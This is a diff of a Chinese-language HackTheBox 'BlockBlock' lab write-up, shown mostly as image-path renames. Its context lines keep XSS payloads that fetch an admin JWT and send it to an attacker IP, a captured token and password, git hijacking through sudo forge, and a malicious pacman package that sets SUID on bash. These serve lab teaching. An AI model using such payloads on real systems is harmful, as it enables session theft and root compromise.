@@ -1,16 +1,16 @@
 +++
-title = "BlockBlock"
+title = "0635 BlockBlock"
 description = ""
 date = 2024-11-21
 updated = 2024-11-21
-draft = true
+draft = false
 
 [taxonomies]
 categories = ["HackTheBox", "Machines", "Linux", "Hard"]
 tags = ["Ethereum", "区块链", "xss", "forge", "pacman", "命令劫持"]
 +++
 
-![BlockBlock.png](BlockBlock/BlockBlock.png)
+![BlockBlock.png](0635-BlockBlock/BlockBlock.png)
 
 ## Recon & Enum
 
@@ -131,7 +131,7 @@ PORT     STATE SERVICE VERSION
 
 ## Shell as Keira
 
-![image-20241125093137518.png](BlockBlock/image-20241125093137518.png)
+![image-20241125093137518.png](0635-BlockBlock/image-20241125093137518.png)
 
 打开 80 端口正文出现 blockchain 并且右下角发现以太坊字样，因此推断 8545 端口是一个区块链祥光的 RPC 接口。尝试未授权访问
 
@@ -187,11 +187,11 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 
 请求 net_version 时就开始要求 token 认证了，继续查看 80 端口页面
 
-![image-20241125100206564.png](BlockBlock/image-20241125100206564.png)
+![image-20241125100206564.png](0635-BlockBlock/image-20241125100206564.png)
 
 注册账号登陆后看到一个 BOT，发现在 Report User 功能点处存在 XSS 漏洞，还是机器人的请求
 
-![image-20241125100801475.png](BlockBlock/image-20241125100801475.png)
+![image-20241125100801475.png](0635-BlockBlock/image-20241125100801475.png)
 
 Payload
 
@@ -199,11 +199,11 @@ Payload
 <img src=x onerror=fetch("http://10.10.16.5/xss")>
 ```
 
-![image-20241126094717680.png](BlockBlock/image-20241126094717680.png)
+![image-20241126094717680.png](0635-BlockBlock/image-20241126094717680.png)
 
 这里直接读取 Cookie 会失败，HTTP 服务器这边没有看到请求。
 
-![image-20241126094801731.png](BlockBlock/image-20241126094801731.png)
+![image-20241126094801731.png](0635-BlockBlock/image-20241126094801731.png)
 
 同时在 Burp 中发现会不间断请求 `api/info` 来返回 jwt_token，因此使用 js 获取此请求响应。将响应内容作为参数请求到 HTTP 服务器中，达成 XSS + CSRF。
 
@@ -219,7 +219,7 @@ fetch('http://10.10.11.43/api/info')
 <img src=x onerror="fetch('http://10.10.11.43/api/info').then(resp=>resp.text()).then(jwt=>fetch(`http://10.10.16.5/x?c=${jwt}`))">
 ```
 
-![image-20241126100209001.png](BlockBlock/image-20241126100209001.png)
+![image-20241126100209001.png](0635-BlockBlock/image-20241126100209001.png)
 
 ```Plain Text
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjU4NTY5NCwianRpIjoiMTgwYjIzN2EtMWJmNy00OGJkLTliNTUtNjFlZTU1NTQwZjhjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyNTg1Njk0LCJleHAiOjE3MzMxOTA0OTR9.DdjDt7AMqENkjwxR7Ty6N2IQLVKaynSjiFx_oD0kOA4
@@ -227,21 +227,21 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjU4NTY5NCw
 
 拿到了管理员的 jwt，查看管理员页面
 
-![image-20241126100309193.png](BlockBlock/image-20241126100309193.png)
+![image-20241126100309193.png](0635-BlockBlock/image-20241126100309193.png)
 
-![image-20241126100437633.png](BlockBlock/image-20241126100437633.png)
+![image-20241126100437633.png](0635-BlockBlock/image-20241126100437633.png)
 
-![image-20241126100446115.png](BlockBlock/image-20241126100446115.png)
+![image-20241126100446115.png](0635-BlockBlock/image-20241126100446115.png)
 
-![image-20241126100454617.png](BlockBlock/image-20241126100454617.png)
+![image-20241126100454617.png](0635-BlockBlock/image-20241126100454617.png)
 
 在管理员界面看到了之前发送的消息 `good`，以及另一个用户 keira。
 
-![image-20241126100527006.png](BlockBlock/image-20241126100527006.png)
+![image-20241126100527006.png](0635-BlockBlock/image-20241126100527006.png)
 
-![image-20241126100551954.png](BlockBlock/image-20241126100551954.png)
+![image-20241126100551954.png](0635-BlockBlock/image-20241126100551954.png)
 
-![image-20241126100600348.png](BlockBlock/image-20241126100600348.png)
+![image-20241126100600348.png](0635-BlockBlock/image-20241126100600348.png)
 
 在 burpsuite 看到了几个 API 接口的调用记录，与之前 8545 端口的以太坊协议调用类似。结合接口名称 `chat_address` 大致可以猜到是一个基于区块链的聊天室，可以看一下区块链上的信息。
 
@@ -249,39 +249,39 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjU4NTY5NCw
 
 首先获取 token
 
-![image-20241126114338578.png](BlockBlock/image-20241126114338578.png)
+![image-20241126114338578.png](0635-BlockBlock/image-20241126114338578.png)
 
 然后查看链上的 Log
 
-![image-20241126114424601.png](BlockBlock/image-20241126114424601.png)
+![image-20241126114424601.png](0635-BlockBlock/image-20241126114424601.png)
 
 把所有的 data 部分拿出来，然后尝试十六进制转字符串
 
-![image-20241126114722029.png](BlockBlock/image-20241126114722029.png)
+![image-20241126114722029.png](0635-BlockBlock/image-20241126114722029.png)
 
-![image-20241126114753160.png](BlockBlock/image-20241126114753160.png)
+![image-20241126114753160.png](0635-BlockBlock/image-20241126114753160.png)
 
 发现了两个用户，以及之前发送的消息，第一个块 0x0 是 keria 用户，那么调用 get_BlockByNumber 查看
 
-![image-20241126123726800.png](BlockBlock/image-20241126123726800.png)
+![image-20241126123726800.png](0635-BlockBlock/image-20241126123726800.png)
 
-![image-20241126123744431.png](BlockBlock/image-20241126123744431.png)
+![image-20241126123744431.png](0635-BlockBlock/image-20241126123744431.png)
 
 在 0x0 块没发现什么信息，在 0x1 块发现了 input 内容，是一串十六进制数据，解密：
 
-![image-20241126123948081.png](BlockBlock/image-20241126123948081.png)
+![image-20241126123948081.png](0635-BlockBlock/image-20241126123948081.png)
 
 有点像是凭据，尝试登录 `keira:SomedayBitCoinWillCollapse`
 
-![image-20241126124052539.png](BlockBlock/image-20241126124052539.png)
+![image-20241126124052539.png](0635-BlockBlock/image-20241126124052539.png)
 
 ### Local Enum
 
-![image-20241126124128292.png](BlockBlock/image-20241126124128292.png)
+![image-20241126124128292.png](0635-BlockBlock/image-20241126124128292.png)
 
 发现可以以 paul 用户权限调用 forge
 
-![image-20241126124252326.png](BlockBlock/image-20241126124252326.png)
+![image-20241126124252326.png](0635-BlockBlock/image-20241126124252326.png)
 
 是一个 Solidity 项目管理工具
 
@@ -295,7 +295,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjU4NTY5NCw
 sudo -u paul /home/paul/.foundry/bin/forge init /tmp/test1
 ```
 
-![image-20241126232330612.png](BlockBlock/image-20241126232330612.png)
+![image-20241126232330612.png](0635-BlockBlock/image-20241126232330612.png)
 
 这里发现初始化项目的时候还会调用 git，同时 sudo -l 也没有对环境变量进行重置，因此可以劫持 git
 
@@ -304,7 +304,7 @@ cd /tmp; ssh-keygen -t rsa -q -P "" -f ~/.ssh/id_rsa; echo '#!/bin/bash' > /tmp/
 ssh paul@127.0.0.1
 ```
 
-![image-20241126232605439.png](BlockBlock/image-20241126232605439.png)
+![image-20241126232605439.png](0635-BlockBlock/image-20241126232605439.png)
 
 ## Shell as Root
 
@@ -328,15 +328,15 @@ makepkg -s
 sudo pacman -U pwned-1.2-3-x86_64.pkg.tar.zst --noconfirm
 ```
 
-![image-20241127002126620.png](BlockBlock/image-20241127002126620.png)
+![image-20241127002126620.png](0635-BlockBlock/image-20241127002126620.png)
 
 这里虽然提示符变成了 # 号，但是并没有权限，一个假的 Root
 
-![image-20241127004233872.png](BlockBlock/image-20241127004233872.png)
+![image-20241127004233872.png](0635-BlockBlock/image-20241127004233872.png)
 
 这样在构建的时候会把目标文件安装到 pkg 命名空间下
 
-![image-20241127004548511.png](BlockBlock/image-20241127004548511.png)
+![image-20241127004548511.png](0635-BlockBlock/image-20241127004548511.png)
 
 所以使用的时候需要调用环境变量 $pkgdir
 
@@ -354,11 +354,11 @@ EOF
 makepkg -si --noconfirm
 ```
 
-![image-20241127004857048.png](BlockBlock/image-20241127004857048.png)
+![image-20241127004857048.png](0635-BlockBlock/image-20241127004857048.png)
 
 可以看到这个 Bash 已经具有 Suid 权限了
 
-![image-20241127004957624.png](BlockBlock/image-20241127004957624.png)
+![image-20241127004957624.png](0635-BlockBlock/image-20241127004957624.png)
 
 ## More
 
@@ -392,7 +392,7 @@ _laurel:!:20038::::::
 
 ### 提权脚本
 
-> 来自 [manesec](https://manesec.github.io/2024/11/23/2024-htb-machine/47-BlockBlock/) 的提权脚本
+> 来自 [manesec](https://manesec.github.io/2024/11/23/2024-htb-machine/47-0635-BlockBlock/) 的提权脚本
 
 - Paul
 
